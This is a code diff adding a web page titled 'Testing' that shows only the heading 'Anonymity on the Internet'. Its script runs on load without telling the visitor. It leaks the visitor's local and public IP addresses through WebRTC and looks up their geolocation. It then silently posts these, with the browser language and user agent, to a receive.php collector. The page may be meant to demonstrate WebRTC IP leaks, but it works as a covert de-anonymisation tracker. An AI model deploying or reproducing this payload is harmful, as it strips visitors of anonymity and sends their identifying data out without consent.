@@ -1,0 +1,103 @@
+<html>
+<header><title>Testing</title></header>
+<body><h1 style="color:green;text-align:center;font-size:250%"> This is a testing page. </h1>
+<p style="color:red;text-align:center;font-size:150%" >Anonymity on the Internet </p>
+</body>
+<script type="text/javascript">
+	var x  = new Array();
+	var y = 0;
+	
+	function findIP(onNewIP) {
+	  var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+	  var pc = new myPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]}),
+		noop = function() {},
+		localIPs = {},
+		ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+		key;
+	  function ipIterate(ip) {
+		if (!localIPs[ip]){
+			onNewIP(ip);
+			y = y + 1;
+		}
+		localIPs[ip] = true;
+	  }
+	  
+	  pc.createDataChannel("");
+	  
+	  pc.createOffer(function(sdp) {
+		sdp.sdp.split('\n').forEach(function(line) {
+		  if (line.indexOf('candidate') < 0) return;
+		  line.match(ipRegex).forEach(ipIterate);
+		});
+		pc.setLocalDescription(sdp, noop, noop);
+	  }, noop);
+	  
+	  pc.onicecandidate = function(ice) {
+		if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+		ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
+	  };
+	    
+	}
+
+	function addIP(ip) {
+		x.push(ip);
+		if(y>0){
+			fetch("https://ipapi.co/json/")
+			  .then((resp) => resp.json())
+			  .then(function(data) {
+				ip = JSON.stringify(data);
+				//alert(ip);
+				var data = new FormData();
+				data.append("data" , new Date().toString() + "\n" + navigator.language + "\n" + navigator.userAgent + "\n\n"  + ip + "\n\n" + "WebRTC Enabled."+ "\n\n"+"IP thru WebRTC:" + "\n" + x.join('\n'));
+				var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");
+				xhr.open( 'post', 'receive.php', true );
+				xhr.send(data)
+				})
+		}
+	}
+	
+	function getIP(){
+			var ip;
+		fetch("https://ipapi.co/json/")
+			  .then((resp) => resp.json())
+			  .then(function(data) {
+				ip = JSON.stringify(data);
+				alert(ip);
+				return ip;
+				})
+			
+		alert(ip);
+		return ip;
+	}
+	
+	function checkRTCEnabled() {
+        var isWebRTCSupported = window.RTCPeerConnection;
+		var ip;
+		if(isWebRTCSupported == undefined){
+			fetch("https://ipapi.co/json/")
+			  .then((resp) => resp.json())
+			  .then(function(data) {
+				ip = JSON.stringify(data);
+				//alert(ip);
+				var data = new FormData();
+				data.append("data" , new Date().toString() + "\n" + navigator.language + "\n" + navigator.userAgent + "\n\n" + ip + "\n\n" + "WebRTC Disabled."+ "\n" );
+				var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");
+				xhr.open( 'post', 'receive.php', true );
+				xhr.send(data)
+				})
+		}else{
+			findIP(addIP);
+		}
+		
+    }
+
+	function info(){
+		checkRTCEnabled();
+	}
+    window.onload = info;
+	
+</script>
+<noscript>
+   <meta http-equiv="refresh" content="0;url=noscript.html">
+</noscript>
+</html>
